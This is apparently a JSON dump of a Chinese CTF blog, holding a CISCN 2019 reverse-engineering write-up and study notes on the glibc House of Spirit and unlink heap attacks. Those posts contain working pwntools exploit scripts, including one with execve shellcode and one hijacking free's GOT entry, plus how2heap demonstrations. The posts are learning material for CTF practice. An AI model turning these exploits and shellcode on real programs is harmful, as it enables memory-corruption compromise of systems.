123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#include &lt;stdio.h&gt;#define __int64 long long#define __int8 char#define _BYTE unsigned char#define _WORD unsigned short#define _DWORD unsigned int#define LOBYTE(x) (*((_BYTE*)&amp;(x))) // low byte #define LOWORD(x) (*((_WORD*)&amp;(x))) // low word #define LODWORD(x) (*((_DWORD*)&amp;(x))) // low dword #define HIBYTE(x) (*((_BYTE*)&amp;(x)+1)) #define HIWORD(x) (*((_WORD*)&amp;(x)+1)) #define HIDWORD(x) (*((_DWORD*)&amp;(x)+1)) #define BYTEn(x, n) (*((_BYTE*)&amp;(x)+n)) #define WORDn(x, n) (*((_WORD*)&amp;(x)+n)) #define BYTE1(x) BYTEn(x, 1) // byte 1 (counting from 0) #define BYTE2(x) BYTEn(x, 2) #define BYTE3(x) BYTEn(x, 3) #define BYTE4(x) BYTEn(x, 4)unsigned char data[]=&#123; 0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48, 0xC6, 0xBA, 0xB1, 0xA3, 0x00, 0x00, 0x00, 0x00, 0x50, 0x33, 0xAA, 0x56, 0x00, 0x00, 0x00, 0x00, 0x97, 0x91, 0x7D, 0x67, 0x00, 0x00, 0x00, 0x00, 0xDC, 0x22, 0x70, 0xB2, 0x00, 0x00, 0x00, 0x00&#125;;long long table[]=&#123;0x0078da27f844fdd1,0x0011508c60fc86a8, 0x00424adbca3c9b78,0x001edff37133dadc, 0x002d6f30b72f5731,0x00646f38d17560d5, 0x006a9ec9f150e4ad,0x0047c478c16d51b7, 0x00654ac0925a0855,0x002acd03e72b4d73, 0x006c607809a5a671,0x00061673df68b5ba, 0x007723b0becf17c0,0x004cd4e74b53dc65, 0x001d0f96c282ec15,0x00547c7686512b09, 0x001b65c1b9383cbc,0x006dd7967009d87f, 0x000afb8629d9217a,0x00490d14437c248b, 0x001efc829bc5cfbe,0x005b8ef37683e1b6, 0x0054de5a1d64849f,0x00068a31fa1fa382, 0x004770760f09a64c,0x00636d44915d5beb, 0x00621e68982b67bc,0x003825cf5fd2e1e6, 0x004cd057e794f4f6,0x00772696beb95357, 0x0045fd07fb3bcfc0,0x0066505eb43dc7dd&#125;;unsigned char sub_400D38(unsigned char a1)&#123; return data[a1];&#125;unsigned __int64 __fastcall sub_400D87(int a1)&#123; unsigned __int8 v1; // ST30_1 unsigned __int8 v2; // ST31_1 unsigned __int8 v3; // ST32_1 unsigned __int8 v4; // al unsigned __int64 v5; // ST10_8 v1 = sub_400D38(BYTE3(a1)); v2 = sub_400D38(BYTE2(a1)); v3 = sub_400D38(BYTE1(a1)); v4 = sub_400D38(a1); v5 = ((unsigned __int64)v3 &lt;&lt; 8) | ((unsigned __int64)v2 &lt;&lt; 16) | ((unsigned __int64)v1 &lt;&lt; 24) | v4; return (((unsigned __int64)((v3 &lt;&lt; 8) | (v2 &lt;&lt; 16) | (v1 &lt;&lt; 24) | (unsigned int)v4) &lt;&lt; 18) | (v5 &gt;&gt; 14)) ^ v5 ^ (4LL * ((v3 &lt;&lt; 8) | (v2 &lt;&lt; 16) | (v1 &lt;&lt; 24) | (unsigned int)v4) | (v5 &gt;&gt; 30)) ^ (((unsigned __int64)(unsigned int)v5 &lt;&lt; 10) | (v5 &gt;&gt; 22)) ^ (((unsigned __int64)((v3 &lt;&lt; 8) | (v2 &lt;&lt; 16) | (v1 &lt;&lt; 24) | (unsigned int)v4) &lt;&lt; 24) | (v5 &gt;&gt; 8));&#125;void test(char c)&#123; int i,j,k; int a,b; a = (c&amp;0xf)+0x30; b = (c&gt;&gt;4)+0x30; if(b&lt;=0x39) printf(\"%02x \",b); else printf(\"%02x \",b+7); if(a&lt;=0x39) printf(\"%02x \",a); else printf(\"%02x \",a+7); printf(\"%c\\n\",c);&#125; int main()&#123; int res[64]; res[35] = 0xef468dba; res[34] = 0xf985b250; res[33] = 0x9c9e200c; res[32] = 0xf3525ab6; int i,j,k; for(i=31;i&gt;=0;i--) &#123; res[i] = res[i+4]^sub_400D87(res[i+1]^res[i+2]^res[i+3]^table[i]); &#125; printf(\"0x%x\\n0x%x\\n0x%x\\n0x%x\\n\",res[0],res[1],res[2],res[3]); int s = &#123;0xe9,0x55,0x47,0x9b,0x8a,0x0a,0x0f,0xfd,0x82,0x24,0x5f,0x47,0x33,0x85,0x91,0xc4&#125;; for(i=0;i&lt;128;i++) &#123; test(i); &#125; return 0;&#125; 于是可以得到v3={0x36, 0x32, 0x36, 0x31, 0x36, 0x34, 0x37, 0x32, 0x36, 0x35, 0x37, 0x32, 0x33, 0x31, 0x33, 0x32}； 这样我们得到v13的值，再进一步回推sub_4066c0，就可以到正确的输入。 可以发现是把一个字节扩展为两个字节的函数，而替换表刚刚的脚本已经一同打印出来了，通过比对，得到用户名为：’badrer12’ 密码密码部分是一个使用while循环实现的虚拟机，通过分析各个调用表的函数内容，得到的伪汇编代码如下（部分）： 实现的功能是将输入与’x’,’y’,’z’,’{‘,’|’,’}’分别异或，然后把每次异或的结果异或，并且要求得到0，这样就说明密码就是’xyz{|}’。 最后远程需要借助pwntools，不然莫得回显 12345678910111213141516#!/usr/bin/python#-*- coding:UTF-8 -*-from pwn import*context.log_level = 'debug'p = remote('39.106.224.151', 10001)p.recvuntil('name')p.sendline('badrer12')p.recvuntil('word:')p.send('xyz&#123;|&#125;')p.interactive() 0x02 总结emmm国赛只会做两个逆向。。。其中一个还是调试得到。。。 不过对于虚拟机这样的题又练了手，之前一直觉得这类题好难，看不懂，其实主要是不够耐心（卒。希望在接下来的比赛中能多做几道逆向。。。不然太划水感觉都要被t出队伍了QAQ","path":"2019/05/12/ciscn2019net/","date":"05-12","excerpt":"可以说，ciscn是我至今为数不多能做出题的比赛了23333菜的真实"},{"title":"Study Note - House of Spirit","text":"学习总结，一个理解起来比较简单的堆的漏洞利用，是Fastbin Attack之一。 环境：Ubuntu16.04 64bit 文件：pwn200 参考：wiki、how2heap、fanda、BruceFan 0x00 House of Spirit原理这个需要先了解glibc的fastbin机制，大致上fastbin里的堆块大小都在2*SIZE_SZ ~ av-&gt;system_mem的范围之内，在x64的机器上，就是大于16字节，小于128字节（32位系统默认是8字节到64字节）。由于fastbin采取LIFO策略，最近释放的chunk会被更早地分配。这样的话，我们能组织House of Spirit攻击。 12345678910111213+--------------+| || controllable | //可控区域1| |+--------------+| ||uncontrollable| //不可控区域(目标控制区域)| |+--------------+| || controllable | //可控区域2| |+--------------+ 在这种情形中，我们可以构造可控区域1和可控区域2，然后覆盖一个堆指针，使之指向可控区域1，然后free该块区域，使之进入到fastbin中，然后重新申请该区域，那么不可控区域就变得可操作了。 利用思路1，我们需要通过可控区域1和可控区域2，把这个区域伪造成一个fast chunk 2，覆盖一个堆指针，让这个指针指向fast chunk 3，free这个fast chunk 4，申请刚刚释放的区域，这样不可控区域就变得可控了 free时，相关代码如下： 12345678910111213141516__libc_free (void *mem)&#123; mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ &#123; munmap_chunk (p); return; &#125; ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0);&#125; 要将堆块释放到fastbin，需要满足一些限制： fake chunk的ISMMAP位不能为1，当free时，如果时mmap的chunk，会做单独处理 fake chunk地址需要对齐，MALOC_ALIGN_MASK 123456789#ifndef INTERNAL_SIZE_T# define INTERNAL_SIZE_T size_t#endif/* The corresponding word size. */#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))/* The corresponding bit mask value. */#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) fake chunk的size大小需要满足对应的fastbin的需求，同时也得对齐 fake chunk的next chunk的大小不能小于2 * SIZE_SZ，同时也不能大于av-&gt;system_mem fake chunk对应的fastbin链表头部不能是该fake chunk，既不能构成double free的情况 0x01 栗子借用how2heap的例子，源网页在此。 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, \"This file demonstrates the house of spirit attack.\\n\"); fprintf(stderr, \"Calling malloc() once so that it sets up its memory.\\n\"); malloc(1); fprintf(stderr, \"We will now overwrite a pointer to point to a fake 'fastbin' region.\\n\"); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, \"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\\n\", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); fprintf(stderr, \"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n\"); fprintf(stderr, \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\"); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, \"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\\n\"); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr, \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", &amp;fake_chunks[1]); fprintf(stderr, \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\"); a = &amp;fake_chunks[2]; fprintf(stderr, \"Freeing the overwritten pointer.\\n\"); free(a); fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, \"malloc(0x30): %p\\n\", malloc(0x30));&#125; 通过将fake_chunk[1]作为fast chunk的size，fake_chunk[9]作为fast chunk下一个chunk的size，然后把指针a指向fake_chunk[2]，完成构造，然后free，再次申请，就能把对应区域申请回来。 House of Spirit的技术关键在于合理构造目标区域前后的数据，然后绕过相关的检测。 0x02 pwn200(LCTF2016)刚开始的函数是这样的 1234567891011121314151617181920int sub_400A8E()&#123; signed __int64 i; // [rsp+10h] [rbp-40h] char v2[48]; // [rsp+20h] [rbp-30h] puts(\"who are u?\"); for ( i = 0LL; i &lt;= 47; ++i ) &#123; read(0, &amp;v2[i], 1uLL); if ( v2[i] == 10 ) &#123; v2[i] = 0; break; &#125; &#125; printf(\"%s, welcome to xdctf~\\n\", v2); puts(\"give me your id ~~?\"); input_max4(); return sub_400A29();&#125; 可以看到v2可以刚好填满而没有0结尾，所以可以泄露出rbp。 啊自己尝试写了一下，惨不忍睹2333，还是搬运BruceFan的利用exp吧。。。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/python#coding:utf-8from pwn import *#r = remote('127.0.0.1', 6666)p = process(\"./pwn200\")shellcode = \"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"def pwn(): # gdb.attach(p, \"b *0x400991\") data = shellcode.ljust(46, 'a') data += 'bb' p.send(data) p.recvuntil('bb') rbp_addr = p.recvuntil(', w')[:-3] rbp_addr = u64(rbp_addr.ljust(8,'\\x00')) print hex(rbp_addr) fake_addr = rbp_addr - 0x90 shellcode_addr = rbp_addr - 0x50 # 输入id伪造下一个堆块的size p.recvuntil('id ~~?') p.sendline('32') p.recvuntil('money~') data = p64(0) * 5 + p64(0x41) # 伪造堆块的size data = data.ljust(0x38, '\\x00') + p64(fake_addr) # 覆盖堆指针 p.send(data) p.recvuntil('choice : ') p.sendline('2') # 释放伪堆块进入fastbin p.recvuntil('choice : ') p.sendline('1') p.recvuntil('long?') p.sendline('48') p.recvuntil('\\n48\\n') # 将伪堆块申请出来 data = 'a' * 0x18 + p64(shellcode_addr) # 将eip修改为shellcode的地址 data = data.ljust(48, '\\x00') p.send(data) p.recvuntil('choice : ') p.sendline('3') # 退出返回时回去执行shellcode p.interactive()if __name__ == '__main__': pwn() 0x03 总结这个利用起来真的要计算清楚位置和大小，而且要熟练掌握chunk的结构。然后就是各种小地方的问题，要多调试。。。 fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 构造好目标区域前后的数据。在House of Spirit中重要的好像就是两个地方的size以及size的标记位，其他的可以不管，比如pre size这样的就不需要，总的来说还是比unlink需要构造的地方少一点，好像（萌新之言。。。","path":"2019/04/03/studypwn_houseofspirit/","date":"04-03","excerpt":"学习总结，一个理解起来比较简单的堆的漏洞利用，是Fastbin Attack之一。"},{"title":"Study Note - Unlink","text":"啊，花了一天多的时间来弄懂unlink的原理和一个简单的应用。只能说，pwn真好玩，就是头上有点凉，就是我太菜了。写个学习笔记记录一下，以免忘了。。。 环境：Ubuntu16.04 文件：unlink 参考：how2pwn、堆溢出之unlink的利用、unsafe-unlink demo、wiki 0x00 Unlink在弄清楚unlink之前，需要先了解一下glibc的内存管理。 unlink发生在当释放一个堆块P时，glibc会检查与这个堆块物理相邻的堆块(假设是)S是否是空闲的，如果是的话，就会unlink(S)，然后合并两个堆块P、S。 malloc_chunk的定义是这样子的： 1234567891011121314151617/* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below.*/struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ //上一个chunk的大小 INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ //这个chunk的大小 //如果本chunk不是空闲的，这里开始存着用户数据 struct malloc_chunk* fd; /* double links -- used only if free. */ //如果本chunk是空闲的，这个指向下一个空闲的chunk struct malloc_chunk* bk; //如果本chunk是空闲的，这个指向上一个空闲的chunk /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; unlink的操作可以借助wiki上的图片： 可以看到，就是双向链表中删除节点P的操作。 12p-&gt;fd-&gt;bk = p-&gt;bk;p-&gt;bk-&gt;fd = p-&gt;fd; 然后P节点就被从链表中删除了。 0x01 利用简单的栗子假设这样一个堆块 12345678910111213141516+--------------+ &lt;- chunk0 ptr| prev_size |+--------------+| size |+--------------+ &lt;- chunk0| user data |+--------------+| unused bytes |+--------------+ &lt;- chunk1 ptr| prev_size |+--------------+| size |+--------------+ &lt;- chunk1| user data |+--------------+| ... | 现在chunk1已经是空闲状态了，当通过对chunk0的写能够溢出到chunk1的时候，我们覆盖user data部分的fd和bk指针，使fd = target addr - 12，bk = except value，然后我们free(chunk0)。这样的话glibc检查发现chunk1也是空闲的，就会发起合并操作，这样就会触发unlink(chunk1)，从而： 12chunk1-&gt;fd-&gt;bk = chunk1-&gt;bk; //效果就是target addr - 12 + 12 = except valuechunk1-&gt;bk-&gt;fd = chunk1-&gt;fd; //实际上对结构体元素的查找就是地址+元素偏移，fd相对于chunk ptr的偏移就是12 这样的话我们就能在target addr处是实现一个改写(如果有写权限的话)。 实际上然鹅，实际上unlink并没有这么顺利，unlink宏现在已经加了一个检查： 12345678910111213141516171819202122232425262728#define unlink(P, BK, FD) &#123; \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P); \\ else &#123; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ if (!in_smallbin_range (P-&gt;size) \\ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \\ assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P); \\ assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P); \\ if (FD-&gt;fd_nextsize == NULL) &#123; \\ if (P-&gt;fd_nextsize == P) \\ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \\ else &#123; \\ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \\ &#125; \\ &#125; else &#123; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ &#125; \\ &#125; \\ &#125; \\ &#125; 可以看到第4行的检查，所以需要通过这个判断才行。简单的利用是不能通过的。 为了过判断，需要一个全局指针chunk_ptr，然后构造fake chunk，举个栗子： 12345678910111213141516171819202122+--------------+ &lt;- chunk_ptr //使全局变量指向堆块| prev_size |+--------------+| size |+--------------+ - &lt;- chunk0|fake pre size | |+--------------+ || fake size | |+--------------+ ||&amp;chunk_ptr-12 | fake+--------------+ chunk| &amp;chunk_ptr-8 | |+--------------+ || unused bytes | |+--------------+ - &lt;- chunk1 ptr|new prev_size |+--------------+| size |0|+--------------+ &lt;- chunk1| user data |+--------------+| ... | 在chunk0中伪造一个fake chunk，使得fake chunk.fd = chunk_ptr-12，fake chunk.bk = chunk_ptr-8，然后通过溢出，修改chunk1的prev_size为fake chunk的大小，然后要把chunk1的size的最低位改成0，表示前一个chunk(fake chunk)是空闲的。 然后free(chunk1)，然后就会触发unlink(fake chunk)，在进行检验的时候： 1234FD = chunk_ptr-&gt;fd = &amp;chunk_ptr-12BK = chunk_ptr-&gt;bk = &amp;chunk_ptr-8FD-&gt;bk = &amp;chunk_ptrBK-&gt;fd = &amp;chunk_ptr 所以，chunk_ptr就是指向fake chunk，也就是P，所以满足判断(FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P)，这样就能继续完成unlink，完成后结果就是 12FD-&gt;bk = chunk_ptr-&gt;bk; //使得*chunk_ptr = &amp;chunk_ptr-8BK-&gt;fd = chunk_ptr-&gt;fd; //使得*chunk_ptr = &amp;chunk_ptr-12 这样的的话chunk_ptr就会指向&amp;chunk_ptr-12的位置，也就是说，这样以后，就能把chunk_ptr改写成任意目标地址，然后再次往chunk_ptr中写，这样就能实现一次任意地址覆盖，从而控制程序流程。 0x02 栗子这里借用how2heap的例子，源地址。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;uint64_t *chunk0_ptr;int main()&#123; fprintf(stderr, \"Welcome to unsafe unlink 2.0!\\n\"); fprintf(stderr, \"Tested in Ubuntu 14.04/16.04 64bit.\\n\"); fprintf(stderr, \"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n\"); fprintf(stderr, \"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n\"); int malloc_size = 0x80; //we want to be big enough not to use fastbins int header_size = 2; fprintf(stderr, \"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n\"); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 fprintf(stderr, \"The global chunk0_ptr is at %p, pointing to %p\\n\", &amp;chunk0_ptr, chunk0_ptr); fprintf(stderr, \"The victim chunk we are going to corrupt is at %p\\n\\n\", chunk1_ptr); fprintf(stderr, \"We create a fake chunk inside chunk0.\\n\"); fprintf(stderr, \"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\\n\"); chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3); fprintf(stderr, \"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\\n\"); fprintf(stderr, \"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\\n\"); chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr, \"Fake chunk fd: %p\\n\",(void*) chunk0_ptr[2]); fprintf(stderr, \"Fake chunk bk: %p\\n\\n\",(void*) chunk0_ptr[3]); fprintf(stderr, \"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n\"); uint64_t *chunk1_hdr = chunk1_ptr - header_size; fprintf(stderr, \"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n\"); fprintf(stderr, \"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n\"); chunk1_hdr[0] = malloc_size; fprintf(stderr, \"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\\n\",(void*)chunk1_hdr[0]); fprintf(stderr, \"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\\n\\n\"); chunk1_hdr[1] &amp;= ~1; fprintf(stderr, \"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n\"); fprintf(stderr, \"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n\"); free(chunk1_ptr); fprintf(stderr, \"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n\"); char victim_string[8]; strcpy(victim_string,\"Hello!~\"); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr, \"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n\"); fprintf(stderr, \"Original value: %s\\n\",victim_string); chunk0_ptr[0] = 0x4141414142424242LL; fprintf(stderr, \"New Value: %s\\n\",victim_string);&#125; 当堆分配完的时候，内存分布可以表示为这样： 然后通过溢出，构造fake_chunk，并将&amp;chunk0_ptr-3*8和&amp;chunk_ptr-2*8作为其fd和bk，并修改chunk1的Pre size和Size的值。 在chunk0中布置好以后，需要把chunk1的pre size改掉，以及chunk1的size的最低为修改为0，表示前一个chunk是“空闲”的。然后free掉chunk1。触发unlink。最终使得chunk0_ptr指向&amp;chunk_ptr-3*8的位置。 然后就通过写入，把chunk0_ptr改成目标地址，然后再写入，修改目标地址的值。 可以看到成功了。 0x03 Demo在ida中可以看得出来，set函数是有问题的，可以发生溢出。 123456789101112ssize_t func_set_chunk()&#123; int v1; // [esp+Ch] [ebp-Ch] v1 = -1; write(1, \"Set chunk index:\", 0x10u); __isoc99_scanf(\"%d\", &amp;v1); if ( v1 &lt; 0 ) return write(1, \"Set chunk data error!\\n\", 0x16u); write(1, \"Set chunk data:\", 0xFu); return read(0, buf[v1], 0x400u);&#125; 是个萌新友好向的demo，可以试着修改一下free的got表的值。 利用脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/python#-*- coding:UTF-8 -*-from pwn import *p = process('./heap')elf = ELF('./heap')#context.log_level='debug'chunk_ptr = 0x08049D60def add_chk(size): p.recvuntil('5.Exit\\n') p.sendline('1') p.recvuntil('Input the size of chunk you want to add:') p.sendline(str(size))def set_chk(index,buff): p.recvuntil('5.Exit\\n') p.sendline('2') p.recvuntil('Set chunk index:') p.sendline(str(index)) p.recvuntil('Set chunk data:') p.send(buff)def del_chk(index): p.recvuntil('5.Exit\\n') p.sendline('3') p.recvuntil('Delete chunk index:') p.sendline(str(index))def pri_chk(index): p.recvuntil('5.Exit\\n') p.sendline('4') p.recvuntil('Print chunk index:') p.sendline(str(index))def exi_chk(): p.recvuntil('5.Exit\\n') p.sendline('5')add_chk(0x80)add_chk(0x80)add_chk(0x80)payload = p32(0) + p32(0)payload += p32(chunk_ptr - 12) + p32(chunk_ptr - 8)payload += '0'*0x70payload += p32(0x80) + p32(0x88)set_chk(0,payload)del_chk(1)#gdb.attach(p,'b *0x080486F8\\n')set_chk(0,'a'*12 + p32(elf.got['free']))set_chk(0,'aaaa')del_chk(2)p.interactive() 可以看到free的got表地址已经被修改了。 0x04 总结总共花了两天多的时间，除去记录以外，学习unlink的时间竟然大部分卡在了。。。这个fake chunk和要free的那一块这么合并啊？？？啊，菜得真实。。。其实完全不需要管后面到底怎么合并的嘛！ 其实这个demo的利用还没结束，最好还能任意代码执行，下次有时间再填坑好了（挖坑！接着挖坑！。","path":"2019/04/02/studypwn_unlink/","date":"04-02","excerpt":"啊，花了一天多的时间来弄懂unlink的原理和一个简单的应用。只能说，pwn真好玩，就是头上有点凉，就是我太菜了。写个学习笔记记录一下，以免忘了。。。"},{"title":"突然的更新","text":"欸，虽然早就觉得之前的blog的风格太死宅花里胡哨，但是已知没有换一个（其实想换的，但是正好赶上NexT的更新，就觉得要不再等等~然后就23333）这回趁着把主题换了，顺便写点，给新的一年，新学期的开始，开个好头。。。 更新了主题啊哈，NexT这个主题真的敲好看23333配置起来也挺方便的，就很开心。 未完的坑说起来，上个学期开了俩坑来着，一个是密码的总结，一个补题计划。。。但是，我觉得密码总结上写的好像哪都能找到。。。就打算换一种写法，写成不同的密码算法在汇编后的特征，这个倒是比较少，算是开的坑1。 另外一个补题计划，原本打算寒假补题来着，然后参加了美赛（逃不出卢浮宫的四天.jpg），然后要完成一个逆向任务，本来应该是很简单的，毕竟只要复现算法，也没有混淆啥的。。。但是代码写的时候弄错了类型大小= =。结果硬是一行一行调试对比才发现（喷血.jpg）。所以也没有补多少，佛了。 新坑首先，为打好三周后的比赛，要复现往年的逆向题和pwn题。。。鉴于自己菜鸡实力，得尽早完成才行。 然后，是一个我感觉比较有趣的新坑，想写一个多人在线打麻将的小程序。由于之前补完了天才麻将少女的番，感觉说不定有几个技能可以写出来实现一下，哦莫昔洛依desu。顺便提升一下python能力，还有接触一下网络编程方面的知识。 未完待续嗯哼，不知道能不能稳稳的前进呢。","path":"2019/03/05/a_new_term/","date":"03-05","excerpt":"欸，虽然早就觉得之前的blog的风格太死宅花里胡哨，但是已知没有换一个（其实想换的，但是正好赶上NexT的更新，就觉得要不再等等~然后就23333）这回趁着把主题换了，顺便写点，给新的一年，新学期的开始，开个好头。。。"},{"title":"magic","text":"这个题调得有点久23333 但是收获很大0v0 题目在此 先看看直接运行有警告（黑客做的东西一个都不能在实体机上打开.jpg 命令行运行试试 看这时间就很有意思啊orz 看来还得获取正确的时间 工具x64dbg &amp; IDA 漫长的调试之路 入口看起来就有点迷 